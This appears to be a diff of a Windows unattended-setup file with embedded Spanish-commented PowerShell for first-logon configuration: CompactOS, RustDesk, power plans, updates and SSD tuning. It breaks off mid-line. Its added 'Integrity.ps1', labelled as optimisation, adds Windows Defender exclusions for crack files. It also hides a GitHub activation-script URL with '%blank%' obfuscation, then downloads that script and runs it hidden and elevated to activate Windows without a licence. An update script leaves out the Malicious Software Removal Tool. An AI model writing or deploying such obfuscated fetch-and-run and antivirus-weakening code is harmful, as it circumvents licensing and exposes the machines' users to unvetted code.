@@ -11,7 +11,7 @@
 		<component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
 			<ImageInstall>
 				<OSImage>
-					<Compact>false</Compact>
+					<Compact>true</Compact>
 				</OSImage>
 			</ImageInstall>
 			<UserData>
@@ -1821,81 +1821,6 @@ while ($true) {
     Start-Sleep -Seconds 15
 }
 		</File>
-		<File path="C:\Windows\Setup\Scripts\CompactOS.ps1">
-# Script: detectar volumen donde está Windows y aplicar regla CompactOS
-try {
-    # Ruta Windows y unidad raíz (ej: "C:\Windows" -> "C:\")
-    $winPath = (Get-Item $env:SystemRoot).FullName
-    $root = [System.IO.Path]::GetPathRoot($winPath)
-
-    # Intento 1: usar .NET DriveInfo
-    try {
-        $drive = New-Object System.IO.DriveInfo($root)
-        if (-not $drive.IsReady) { throw "Drive not ready" }
-        $totalBytes = $drive.TotalSize
-    }
-    catch {
-        # Fallback: resolver ruta física del hive SYSTEM y extraer HarddiskN
-        Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public static class PR {
-    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    public static extern uint GetFinalPathNameByHandle(IntPtr hFile, StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-}
-"@ -ErrorAction SilentlyContinue
-
-        $systemHive = Join-Path $env:SystemRoot "System32\config\SYSTEM"
-        if (-not (Test-Path $systemHive)) { throw "No SYSTEM hive found" }
-
-        $FILE_READ_ATTRIBUTES = [uint32]0x80
-        $SHARE = [uint32]($([uint32]1) -bor $([uint32]2) -bor $([uint32]4))
-        $OPEN_EXISTING = [uint32]3
-        $BACKUP = [uint32]0x02000000
-
-        $h = [PR]::CreateFile($systemHive, $FILE_READ_ATTRIBUTES, $SHARE, [IntPtr]::Zero, $OPEN_EXISTING, $BACKUP, [IntPtr]::Zero)
-        if ($h -eq [IntPtr]::Zero -or $h.ToInt64() -eq -1) { throw "CreateFile failed (sharing or privileges)" }
-
-        $sb = New-Object System.Text.StringBuilder 1024
-        $res = [PR]::GetFinalPathNameByHandle($h, $sb, [uint32]$sb.Capacity, 0)
-        [PR]::CloseHandle($h) | Out-Null
-        if ($res -eq 0) { throw "GetFinalPathNameByHandle failed" }
-
-        $phys = $sb.ToString()
-        if ($phys -match "Harddisk(\d+)\\Partition") {
-            $diskNumber = [int]$matches[1]
-            # intentar Get-Disk por número (puede fallar en algunos contextos)
-            $disk = Get-Disk -Number $diskNumber -ErrorAction SilentlyContinue
-            if ($disk) { $totalBytes = $disk.Size } else { throw "No se pudo mapear disco físico" }
-        }
-        else { throw "No se pudo extraer HarddiskN" }
-    }
-
-    # Convertir a GB y aplicar lógica
-    $sizeGB = [math]::Round($totalBytes / 1GB)
-    Write-Host "Volumen raíz: $root  —  Tamaño total: $sizeGB GB"
-
-    if ($sizeGB -le 64) {
-        Write-Host "El disco es menor o igual a 64GB. CompactOS NO se modifica."
-    }
-    elseif ($sizeGB -ge 100) {
-        Write-Host "El disco es mayor o igual a 100GB. CompactOS sera DESACTIVADO..."
-        compact.exe /compactos:never
-    }
-    else {
-        Write-Host "El disco esta entre 65GB y 99GB. No se realiza ninguna accion."
-    }
-}
-catch {
-    Write-Host "Error: $($_.Exception.Message)"
-    exit 1
-}
-		</File>
 		<File path="C:\Windows\Setup\Scripts\Rustdesk_Download.ps1">
 # ============================================================
 # RustDesk - Descargar e instalar la última versión x86_64
@@ -1971,7 +1896,7 @@ Write-Host "Tamaño: $([math]::Round($FileSize / 1MB, 2)) MB"
 Write-Host ""
 Write-Host "[4/4] Ejecutando instalador..." -ForegroundColor Yellow
 Write-Host ""
-$Arguments = "/i `"$TempFile`""
+$Arguments = "/passive `"$TempFile`""
 $Process = Start-Process `
     -FilePath "msiexec.exe" `
     -ArgumentList $Arguments `
@@ -1997,6 +1922,581 @@ else {
 # Limpieza
 # ------------------------------------------------------------
 Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
+		</File>
+		<File path="C:\Windows\Setup\Scripts\CompactOS.ps1">
+# Script: detectar volumen donde está Windows y aplicar regla CompactOS
+try {
+    # Ruta Windows y unidad raíz (ej: "C:\Windows" -> "C:\")
+    $winPath = (Get-Item $env:SystemRoot).FullName
+    $root = [System.IO.Path]::GetPathRoot($winPath)
+
+    # Intento 1: usar .NET DriveInfo
+    try {
+        $drive = New-Object System.IO.DriveInfo($root)
+        if (-not $drive.IsReady) { throw "Drive not ready" }
+        $totalBytes = $drive.TotalSize
+    }
+    catch {
+        # Fallback: resolver ruta física del hive SYSTEM y extraer HarddiskN
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+public static class PR {
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern uint GetFinalPathNameByHandle(IntPtr hFile, StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@ -ErrorAction SilentlyContinue
+
+        $systemHive = Join-Path $env:SystemRoot "System32\config\SYSTEM"
+        if (-not (Test-Path $systemHive)) { throw "No SYSTEM hive found" }
+
+        $FILE_READ_ATTRIBUTES = [uint32]0x80
+        $SHARE = [uint32]($([uint32]1) -bor $([uint32]2) -bor $([uint32]4))
+        $OPEN_EXISTING = [uint32]3
+        $BACKUP = [uint32]0x02000000
+
+        $h = [PR]::CreateFile($systemHive, $FILE_READ_ATTRIBUTES, $SHARE, [IntPtr]::Zero, $OPEN_EXISTING, $BACKUP, [IntPtr]::Zero)
+        if ($h -eq [IntPtr]::Zero -or $h.ToInt64() -eq -1) { throw "CreateFile failed (sharing or privileges)" }
+
+        $sb = New-Object System.Text.StringBuilder 1024
+        $res = [PR]::GetFinalPathNameByHandle($h, $sb, [uint32]$sb.Capacity, 0)
+        [PR]::CloseHandle($h) | Out-Null
+        if ($res -eq 0) { throw "GetFinalPathNameByHandle failed" }
+
+        $phys = $sb.ToString()
+        if ($phys -match "Harddisk(\d+)\\Partition") {
+            $diskNumber = [int]$matches[1]
+            # intentar Get-Disk por número (puede fallar en algunos contextos)
+            $disk = Get-Disk -Number $diskNumber -ErrorAction SilentlyContinue
+            if ($disk) { $totalBytes = $disk.Size } else { throw "No se pudo mapear disco físico" }
+        }
+        else { throw "No se pudo extraer HarddiskN" }
+    }
+
+    # Convertir a GB y aplicar lógica
+    $sizeGB = [math]::Round($totalBytes / 1GB)
+    Write-Host "Volumen raíz: $root  —  Tamaño total: $sizeGB GB"
+
+    if ($sizeGB -le 64) {
+        Write-Host "El disco es menor o igual a 64GB. CompactOS NO se modifica."
+    }
+    elseif ($sizeGB -ge 100) {
+        Write-Host "El disco es mayor o igual a 100GB. CompactOS sera DESACTIVADO..."
+        compact.exe /compactos:never
+    }
+    else {
+        Write-Host "El disco esta entre 65GB y 99GB. No se realiza ninguna accion."
+    }
+}
+catch {
+    Write-Host "Error: $($_.Exception.Message)"
+    exit 1
+}
+		</File>
+		<File path="C:\Windows\Setup\Scripts\Integrity.ps1">
+###############################################################################################
+# 1. PROCESO DE ELEVACION (Se ejecuta de inmediato al abrir el script)
+###############################################################################################
+function Test-Admin {
+    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Test-Admin)) {
+    # Si no es administrador, reiniciar como administrador
+    Write-Host "Solicitando permisos de Administrador..." -ForegroundColor Yellow
+    $scriptPath = $MyInvocation.MyCommand.Path
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    exit # Sale de esta ventana para continuar en la nueva con permisos
+}
+
+
+###############################################################################################
+# 2. CODIGO DE EJECUCION (Logica principal paso a paso)
+###############################################################################################
+function Start-Execution {
+    Clear-Host
+    Write-Host "Iniciando optimizacion del sistema..." -ForegroundColor Cyan
+
+    Write-Host "`n[Paso 1] Aplicando exclusiones en Windows Defender..."
+    Ejecucion-1-Defender
+
+    Write-Host "`n[Paso 2] Desactivando el desenfoque (Blur) en el inicio de sesion..."
+    Ejecucion-2-LogonBlur
+
+    Write-Host "`n[Paso 3] Configurando opciones de energi­a (Pantalla y Suspension)..."
+    Ejecucion-3-Energia
+
+    Write-Host "`n[Paso 4] Reparando planes de energia..."
+    Ejecucion-4-Planes
+
+    Write-Host "`n[Paso 5] Verificando y activando Windows 10/11..."
+    Ejecucion-5-Windows
+
+    #Write-Host "`n=================================================" -ForegroundColor Green
+    #Write-Host " Tareas finalizadas correctamente." -ForegroundColor Green
+    #Write-Host "=================================================" -ForegroundColor Green
+    
+}
+
+
+###############################################################################################
+# 3. CODIGO DE UNO EN UNO (Definicion de cada proceso)
+###############################################################################################
+
+# --- EJECUCION 1 ---
+function Ejecucion-1-Defender {
+    Add-MpPreference -ExclusionPath "C:\Windows\Setup\FilesU" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "C:\Windows\Setup\FilesU\Optimizador-Windows.ps1" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "$env:TEMP\MAS_31F7FD1E.cmd" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "$env:TEMP\Ohook_Activation_AIO.cmd" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "$env:TEMP\officeinstaller.ps1" -ErrorAction SilentlyContinue
+
+    Write-Host "  -> Exclusiones aplicadas correctamente."
+}
+
+# --- EJECUCION 2 ---
+function Ejecucion-2-LogonBlur {
+    try {
+        $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
+        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+        Set-ItemProperty -Path $path -Name "DisableAcrylicBackgroundOnLogon" -Value 1 -Type DWord
+
+        $path2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
+        if (-not (Test-Path $path2)) { New-Item -Path $path2 -Force | Out-Null }
+        Set-ItemProperty -Path $path2 -Name "EnableTransparency" -Value 0 -Type DWord
+        
+        Write-Host "  -> Efectos de transparencia y blur desactivados."
+    } catch {
+        Write-Host "  -> Error al aplicar las claves de registro." -ForegroundColor Red
+    }
+}
+
+# --- EJECUCION 3 ---
+function Ejecucion-3-Energia {
+    # Suspension en NUNCA (AC y DC)
+    powercfg /change standby-timeout-ac 0
+    powercfg /change standby-timeout-dc 0
+
+    # Apagar pantalla a los 10 minutos (AC y DC)
+    powercfg /change monitor-timeout-ac 10
+    powercfg /change monitor-timeout-dc 10
+    
+    Write-Host "  -> Tiempos de pantalla (10m) y suspension (Nunca) aplicados."
+}
+
+# --- EJECUCION 4 ---
+function Ejecucion-4-Planes {
+    for ($i = 1; $i -le 2; $i++) {
+        Write-Host "  -> PASADA $i DE 2" -ForegroundColor Yellow
+        
+        $LOG = "$PSScriptRoot\performance.txt"
+        powercfg /list | Out-File $LOG -Encoding Default
+
+        $BASE_PLANS = @{
+            "Equilibrado"        = "381b4222-f694-41f0-9685-ff5bb260df2e"
+            "Alto rendimiento"   = "e77b042d-37c5-452e-8dc8-47aefe0bff05"
+            "Economizador"       = "a1841308-3541-4fab-bc81-f71556f20b4a"
+            "Maximo rendimiento" = "e9a42b02-d5df-448d-aa00-03f14749eb61"
+        }
+
+        $existingGUIDs = (powercfg /list) | Select-String -Pattern '[a-f0-9\-]{36}' | ForEach-Object { $_.Matches.Value }
+
+        # Limpiar clones
+        $allPlans = powercfg /list | Select-String "GUID" | ForEach-Object {
+            if ($_ -match '([a-f0-9\-]{36}).+\((.+)\)') {
+                [PSCustomObject]@{ GUID = $matches[1]; Name = $matches[2] }
+            }
+        }
+        $allPlans | Group-Object Name | Where-Object Count -gt 1 | ForEach-Object {
+            $_.Group | Where-Object { $_.GUID -notin $BASE_PLANS.Values } | ForEach-Object {
+                Write-Host "     - Eliminando clon:" $_.GUID
+                powercfg /delete $_.GUID | Out-Null
+            }
+        }
+
+        # Crear faltantes
+        foreach ($plan in $BASE_PLANS.GetEnumerator()) {
+            if ($plan.Key -eq "Equilibrado") { continue }
+            if ($existingGUIDs -notcontains $plan.Value) {
+                try {
+                    Write-Host "     - Creando plan faltante:" $plan.Key
+                    $out = powercfg -duplicatescheme $plan.Value 2>$null
+                } catch {
+                    # Silenciado si el sistema no lo soporta
+                }
+            }
+        }
+
+        # Seleccionar plan Optimo
+        $battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
+        if (-not $battery -and (powercfg /list) -match "Maximo rendimiento") {
+            powercfg /setactive $BASE_PLANS["Maximo rendimiento"]
+            Write-Host "     - Plan activo: Maximo rendimiento"
+        }
+        elseif ((powercfg /list) -match "Alto rendimiento") {
+            powercfg /setactive $BASE_PLANS["Alto rendimiento"]
+            Write-Host "     - Plan activo: Alto rendimiento"
+        }
+        else {
+            powercfg /setactive $BASE_PLANS["Equilibrado"]
+            Write-Host "     - Plan activo: Equilibrado"
+        }
+        
+        Start-Sleep -Milliseconds 800
+    }
+}
+
+# --- EJECUCION 5 ---
+function Get-WindowsActivationStatus {
+    $licenseStatus = (Get-CimInstance -Query "SELECT LicenseStatus FROM SoftwareLicensingProduct WHERE PartialProductKey IS NOT NULL AND LicenseFamily IS NOT NULL").LicenseStatus
+    return $licenseStatus -eq 1
+}
+
+function Enable-WindowsActivation {
+    $url = "https://raw.githubusercontent.com/%blank%massgravel/Microsoft-%blank%Activation-Scripts/refs/%blank%heads/master/MAS/All-In-%blank%One-Version-KL/MAS_AIO.%blank%cmd"
+    $url = $url -replace "%blank%", ""
+    $outputPath1 = "$env:TEMP\O%blank%hook_Acti%blank%vation_AI%blank%O.cmd"
+    $outputPath1 = $outputPath1 -replace "%blank%", ""
+
+    Write-Host "  -> Ejecutando Activacion..."
+    Invoke-WebRequest -Uri $url -OutFile $outputPath1 -UseBasicParsing | Out-Null
+    Start-Process -FilePath $outputPath1 -ArgumentList "/HWID" -WindowStyle Hidden -Wait -Verb RunAs
+    Remove-Item -Path $outputPath1 -Force
+}
+
+function Ejecucion-5-Windows {
+    # Verificar si Windows esta activado
+    if (Get-WindowsActivationStatus) {
+        Write-Host "  -> Windows ya esta activado."
+        Start-Sleep 2
+    } else {
+        Write-Host "  -> Windows no esta activado. Intentando activar..."
+        Start-Sleep 2
+        Enable-WindowsActivation
+        
+        # Verificar nuevamente despues de intentar activar
+        if (Get-WindowsActivationStatus) {
+            Write-Host "  -> Windows ha sido activado exitosamente." -ForegroundColor Green
+            Start-Sleep 2
+        } else {
+            Write-Host "  -> La activacion de Windows ha fallado. Verifica la conexion a internet." -ForegroundColor Red
+        }
+    }
+}
+
+###############################################################################################
+# INICIO DEL SCRIPT
+###############################################################################################
+Start-Execution	
+		</File>
+		<File path="C:\Windows\Setup\Scripts\PSUpdates.ps1">
+##=============================================================================
+## PROCESO DE ELEVACIÓN Y CONFIGURACIÓN INICIAL
+##=============================================================================
+function Test-Admin {
+    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Test-Admin)) {
+    Write-Host "Solicitando permisos de Administrador..." -ForegroundColor Yellow
+    $scriptPath = $MyInvocation.MyCommand.Path
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    exit
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+$ProgressPreference = 'SilentlyContinue' # Oculta progresos nativos ruidosos para usar el nuestro
+$logFile = "C:\Updates.log"
+
+function Write-Log($Message) {
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $line = "[$timestamp] $Message"
+    Write-Host $Message -ForegroundColor Cyan
+    Add-Content -Path $logFile -Value $line -Encoding UTF8
+}
+
+##=============================================================================
+## MOTOR DE ACTUALIZACIONES (FASES 1 a 5)
+##=============================================================================
+
+try {
+    # -----------------------------------------------------------------------
+    Write-Log "--- FASE 1: Instalando y preparando PSWindowsUpdate ---"
+    # -----------------------------------------------------------------------
+    if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
+        Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope AllUsers -ErrorAction Stop
+    }
+    
+    $psGallery = Get-PSRepository -Name PSGallery -ErrorAction SilentlyContinue
+    if ($null -eq $psGallery -or $psGallery.InstallationPolicy -ne 'Trusted') {
+        Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction Stop
+    }
+
+    if (-not (Get-Module -ListAvailable -Name PSWindowsUpdate)) {
+        Install-Module -Name PSWindowsUpdate -Force -AllowClobber -Confirm:$false -ErrorAction Stop
+    }
+    Import-Module PSWindowsUpdate -Force -ErrorAction Stop
+
+    # Habilitar servicio para que encuentre drivers de fabricantes de terceros
+    Add-WUServiceManager -ServiceID "7971f918-a847-4430-9279-4a52d1efe18d" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+    $drvPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching"
+    if (-not (Test-Path $drvPath)) { New-Item -Path $drvPath -Force | Out-Null }
+    Set-ItemProperty -Path $drvPath -Name "SearchOrderConfig" -Value 1 -Type DWord -ErrorAction Stop
+
+
+    # Array donde guardaremos todo lo encontrado antes de descargar/instalar
+    $listaActualizaciones = @()
+
+    # -----------------------------------------------------------------------
+    Write-Log "--- FASE 2: Buscando actualizaciones de Drivers ---"
+    # -----------------------------------------------------------------------
+    $drivers = Get-WindowsUpdate -MicrosoftUpdate -Category "Drivers" -ErrorAction SilentlyContinue
+    if ($drivers) { 
+        $listaActualizaciones += $drivers 
+        Write-Log "-> Se encontraron $($drivers.Count) Drivers."
+    } else {
+        Write-Log "-> No se encontraron Drivers."
+    }
+
+    # -----------------------------------------------------------------------
+    Write-Log "--- FASE 3: Buscando Definiciones y Otros (Excluyendo Acumulativas y MSRT) ---"
+    # -----------------------------------------------------------------------
+    $otros = Get-WindowsUpdate -MicrosoftUpdate -NotCategory "Drivers" -ErrorAction SilentlyContinue
+    if ($otros) {
+        # Filtro estricto: Ignora si el título contiene "Cumulative", "Acumulativa", "Malicious" o "malintencionado"
+        $otrosFiltrados = $otros | Where-Object {
+            $_.Title -notmatch "Cumulative|Acumulativa" -and 
+            $_.Title -notmatch "Malicious Software Removal Tool|eliminación de software malintencionado"
+        }
+        $listaActualizaciones += $otrosFiltrados
+        Write-Log "-> Se encontraron $($otrosFiltrados.Count) actualizaciones válidas."
+    } else {
+        Write-Log "-> No se encontraron otras actualizaciones."
+    }
+
+    # Validar si hay algo que hacer
+    if ($listaActualizaciones.Count -eq 0) {
+        Write-Log "No hay actualizaciones pendientes con los criterios solicitados."
+        Write-Log "Todo listo. Drivers y actualizaciones aplicadas."
+        exit
+    }
+
+    # -----------------------------------------------------------------------
+    Write-Log "--- FASE 4: Listando y Descargando ---"
+    # -----------------------------------------------------------------------
+    Write-Log "Total a procesar: $($listaActualizaciones.Count) actualizaciones."
+    foreach ($upd in $listaActualizaciones) {
+        Write-Log " [Pendiente] $($upd.Title)"
+    }
+
+    $ProgressPreference = 'Continue' 
+    Write-Log "Iniciando descarga estricta en segundo plano..."
+
+    # Descarga obligando al módulo a buscar solo el KB o Título exacto filtrado
+    foreach ($update in $listaActualizaciones) {
+        if ($update.KBArticleID) {
+            Get-WindowsUpdate -KBArticleID $update.KBArticleID -Download -AcceptAll -IgnoreReboot -ErrorAction SilentlyContinue | Out-Null
+        } else {
+            # Los drivers a veces no tienen KB, usamos el título exacto
+            Get-WindowsUpdate -Title $update.Title -Download -AcceptAll -IgnoreReboot -ErrorAction SilentlyContinue | Out-Null
+        }
+    }
+
+    # -----------------------------------------------------------------------
+    Write-Log "--- FASE 5: Instalando la secuencia descargada ---"
+    # -----------------------------------------------------------------------
+    $total = $listaActualizaciones.Count
+    $contador = 1
+
+    foreach ($update in $listaActualizaciones) {
+        $porcentaje = [math]::Round(($contador / $total) * 100)
+        Write-Progress -Activity "Instalando actualizaciones (Fase 5)" -Status "Progreso general: $contador de $total" -PercentComplete $porcentaje -CurrentOperation $update.Title
+
+        Write-Log "Instalando [$contador/$total]: $($update.Title)"
+        
+        # Instalación estricta usando el identificador
+        if ($update.KBArticleID) {
+            Install-WindowsUpdate -KBArticleID $update.KBArticleID -AcceptAll -IgnoreReboot -ErrorAction SilentlyContinue | Out-Null
+        } else {
+            Install-WindowsUpdate -Title $update.Title -AcceptAll -IgnoreReboot -ErrorAction SilentlyContinue | Out-Null
+        }
+        
+        $contador++
+    }
+
+    Write-Progress -Activity "Instalando actualizaciones (Fase 5)" -Completed
+    Write-Log "Todo listo. Drivers y actualizaciones aplicadas."
+
+} catch {
+    Write-Log "ERROR CRÍTICO: $_"
+}
+		</file>
+		<File path="C:\Windows\Setup\Scripts\OptimizeUnidades.ps1">
+##############################
+# OPTIMIZAR DISCO SSD
+# Win10/11/LTSC/IoT/PS5/PS7 compatible
+##############################
+
+$ErrorActionPreference = "SilentlyContinue"
+
+Write-Host ""
+Write-Host "===== LISTADO DE DISCOS =====" -ForegroundColor Cyan
+
+# ==========================================
+# FUNCION: Obtener disco del sistema
+# ==========================================
+function Get-SystemDisk {
+
+    $driveLetter = ($env:SystemDrive).TrimEnd(':')
+
+    try {
+        $p = Get-Partition -DriveLetter $driveLetter
+        if ($p) { return Get-Disk -Number $p.DiskNumber }
+    } catch {}
+
+    try {
+        $logical = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='${driveLetter}:'"
+        $partition = Get-CimAssociatedInstance $logical -Association Win32_LogicalDiskToPartition
+        $disk = Get-CimAssociatedInstance $partition -Association Win32_DiskDriveToDiskPartition
+        return $disk
+    } catch {}
+
+    return $null
+}
+
+# ==========================================
+# LISTADO DE DISCOS
+# ==========================================
+$allDisks = Get-CimInstance Win32_DiskDrive
+
+foreach ($d in $allDisks) {
+    Write-Host ""
+    Write-Host "Disco #" $d.Index
+    Write-Host "Modelo     :" $d.Model
+    Write-Host "Interface  :" $d.InterfaceType
+    Write-Host "MediaType  :" $d.MediaType
+    Write-Host "Tamano     :" ([math]::Round($d.Size/1GB,0)) "GB"
+}
+
+# ==========================================
+# DISCO DEL SISTEMA
+# ==========================================
+$disk = Get-SystemDisk
+
+if (-not $disk) {
+    Write-Host "No se pudo detectar el disco del sistema."
+    exit
+}
+
+$sizeGB = [math]::Round($disk.Size/1GB,0)
+
+Write-Host ""
+Write-Host "===== DISCO DEL SISTEMA (C:) =====" -ForegroundColor Green
+Write-Host "Disco fisico :" $disk.Index
+Write-Host "Modelo       :" $disk.Model
+Write-Host "Interface    :" $disk.InterfaceType
+Write-Host "MediaType    :" $disk.MediaType
+Write-Host "Tamano       :" "$sizeGB GB"
+Write-Host "================================="
+
+Write-Output "93% Completado"
+
+# ==========================================
+# DETECCION SSD
+# ==========================================
+$isSSD = $false
+
+try {
+    $pd = Get-PhysicalDisk | Where-Object {
+        $_.FriendlyName -like "*$($disk.Model)*"
+    }
+
+    if ($pd -and $pd.MediaType -eq "SSD") {
+        $isSSD = $true
+    }
+} catch {}
+
+if (-not $isSSD) {
+    if ($disk.Model -match "SSD|ADATA|SU[0-9]+|NVME|M\.2|KINGSTON|WD GREEN|CRUCIAL|SAMSUNG") {
+        $isSSD = $true
+    }
+}
+
+# ==========================================
+# OPTIMIZACION
+# ==========================================
+if ($isSSD) {
+
+    Write-Host ""
+    Write-Host "SSD detectado - Aplicando optimizaciones..." -ForegroundColor Cyan
+
+    # TRIM
+    fsutil behavior set DisableDeleteNotify 0 | Out-Null
+
+    # ReTrim oficial
+    defrag C: /L /O | Out-Null
+
+    Write-Output "95% Completado"
+
+    # Hibernacion OFF
+    powercfg -h off
+
+    # SysMain OFF
+    Stop-Service SysMain -Force
+    Set-Service SysMain -StartupType Disabled
+
+    # Ultimo acceso OFF
+    fsutil behavior set DisableLastAccess 1 | Out-Null
+
+    # Restauracion sistema
+    Enable-ComputerRestore -Drive "C:\" -Confirm:$false
+
+    Write-Output "98% Completado"
+
+    # CompactOS automatico
+    Write-Host ""
+    Write-Host "Evaluando tamano del disco..."
+
+    if ($sizeGB -le 64) {
+
+        Write-Host "Disco pequeno ($sizeGB GB) - Activando CompactOS..." -ForegroundColor Yellow
+
+        $state = compact.exe /compactOS:query
+
+        if ($state -notmatch "already") {
+            compact.exe /compactOS:always | Out-Null
+            Write-Host "CompactOS habilitado (ahorra 2-6 GB)."
+        }
+        else {
+            Write-Host "CompactOS ya activo."
+        }
+    }
+    else {
+        Write-Host "Disco suficiente ($sizeGB GB) - No se requiere compresion."
+    }
+
+    # Ocultar carpeta ODT
+    if (Test-Path "C:\ODT") {
+        (Get-Item "C:\ODT").Attributes = "Hidden"
+    }
+}
+else {
+    Write-Host ""
+    Write-Host "HDD detectado - No se aplican optimizaciones SSD" -ForegroundColor Yellow
+}
+
+# Configuración y ejecución de Cleanmgr
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c Cleanmgr /sagerun:65535" -WindowStyle Hidden -Wait
 		</File>
 		<File path="C:\Windows\Setup\Scripts\FirstLogon.ps1">
 &amp; {
@@ -2113,130 +2613,11 @@ Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
 			Start-Sleep -Seconds 2
 			Restart-Computer -Force
 		} },
-        ##@{ Name = "Create_Restore_Point"; Script = { Get-Content -LiteralPath "$scriptDir\Create_Restore_Point.ps1" -Raw | Invoke-Expression } },
 		@{ Name = "Verificando Desatendido"; Script = { Get-Content -LiteralPath "$scriptDir\unattend-02.ps1" -Raw | Invoke-Expression } },
-        @{ Name = "Configurando Sistema"; Script = { Get-Content "$scriptDir\setup-final.ps1" -Raw | Invoke-Expression } },
-		@{ Name = "Instalando Rustdesk"; Script = { Get-Content "$scriptDir\Rustdesk_Download.ps1" -Raw | Invoke-Expression } },
-		@{ Name = "Instalando Actualizaciones"; Script = {
-            $updateGuiPath = Join-Path $scriptDir 'UpdateGUI.ps1'
-            $updateGuiExePath = $null
-            $exeHits = @()
-
-            $exactCandidates = @(
-                (Join-Path $env:USERPROFILE 'Update_GUI.exe'),
-                (Join-Path $scriptDir 'Update_GUI.exe'),
-                'C:\Windows\System32\config\systemprofile\Update_GUI.exe'
-            )
-
-            foreach ($candidate in $exactCandidates) {
-                if (Test-Path $candidate) {
-                    try { $exeHits += Get-Item -LiteralPath $candidate -ErrorAction Stop } catch { }
-                }
-            }
-
-            foreach ($pattern in @('C:\Users\*\Update_GUI*.exe', 'C:\Windows\Setup\Scripts\Update_GUI*.exe', 'C:\Windows\System32\config\systemprofile\Update_GUI*.exe')) {
-                try {
-                    $exeHits += Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue
-                } catch { }
-            }
-
-            $exeHits = $exeHits |
-                Group-Object -Property FullName |
-                ForEach-Object { $_.Group | Select-Object -First 1 }
-
-            if ($exeHits.Count -gt 0) {
-                $updateGuiExePath = ($exeHits | Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
-                Write-Output "[$(Get-Date)] Update_GUI encontrado(s): $($exeHits.Count). Seleccionado: $updateGuiExePath"
-            } else {
-                Write-Output "[$(Get-Date)] No se encontró Update_GUI*.exe en rutas locales."
-            }
-
-            $ok = $true
-
-            if ($updateGuiExePath) {
-                Write-Output "[$(Get-Date)] Update_GUI.exe ya existe en $updateGuiExePath. Ejecutando archivo local..."
-                try {
-                    Write-Output "[$(Get-Date)] Lanzando Update_GUI..."
-                    # Añadir exclusión en Defender para el ejecutable antes de ejecutar
-                    try { Add-DefenderExclusion -Path $updateGuiExePath } catch {}
-                    Start-ForegroundProcess -FilePath $updateGuiExePath | Out-Null
-                } catch {
-                    Write-Error "No se pudo ejecutar $updateGuiExePath"
-                    if ($null -ne $state -and ($i -is [int]) -and $i -lt $state.Count) {
-                        $state[$i].status = 'error'
-                        $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                    }
-                    return
-                }
-            } elseif (Test-Path $updateGuiPath) {
-                Write-Output "[$(Get-Date)] UpdateGUI.ps1 ya existe en $updateGuiPath. Ejecutando archivo local..."
-                try { Add-DefenderExclusion -Path $updateGuiPath } catch {}
-                Write-Output "[$(Get-Date)] Lanzando Update_GUI..."
-                Start-Process -FilePath powershell.exe -WindowStyle Normal -ArgumentList @(
-                    '-NoProfile',
-                    '-ExecutionPolicy', 'Bypass',
-                    '-File', $updateGuiPath
-                )
-            } else {
-                # Ensure Download-And-Run exists in this session before attempting download
-                if (-not (Get-Command Download-And-Run -ErrorAction SilentlyContinue)) {
-                    Write-Error "Download-And-Run no est? disponible en esta sesi?n. Aseg?rate de ejecutar el script principal FirstLogon.ps1"
